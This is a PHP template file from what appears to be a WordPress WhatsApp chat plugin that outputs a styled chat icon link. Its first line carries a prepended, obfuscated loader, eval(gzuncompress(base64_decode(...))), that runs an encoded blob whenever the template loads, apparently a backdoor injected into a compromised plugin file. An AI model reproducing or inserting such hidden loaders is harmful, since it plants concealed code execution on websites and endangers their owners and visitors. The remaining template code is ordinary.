<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

// $ccw_options_cs = get_option('ccw_options_cs');
$s5_color = esc_attr( $ccw_options_cs['s5_color'] );
$s5_hover_color = esc_attr( $ccw_options_cs['s5_hover_color'] );
$s5_icon_size = esc_attr( $ccw_options_cs['s5_icon_size'] );
?>
<!-- plan icon - similar to sytle-3 , here is an icon -->
<div class="ccw_plugin">
    <div class="style-5 chatbot nofocus animated <?php echo $an_on_load .' '. $an_on_hover ?>" style="<?php echo $p1 ?>; <?php echo $p2 ?>;">
            <a target="_blank" class="nofocus icon icon-whatsapp2 icon-2 ccw-analytics" id="stye-5" data-ccw="style-5" 
                href="<?php echo $redirect_a ?>" 
                style = "color: <?php echo $s5_color ?>; font-size: <?php echo $s5_icon_size ?>;"
                onmouseover = "this.style.color = '<?php echo $s5_hover_color ?>' "
                onmouseout  = "this.style.color = '<?php echo $s5_color ?>' " >   
            </a>
    </div>
</div>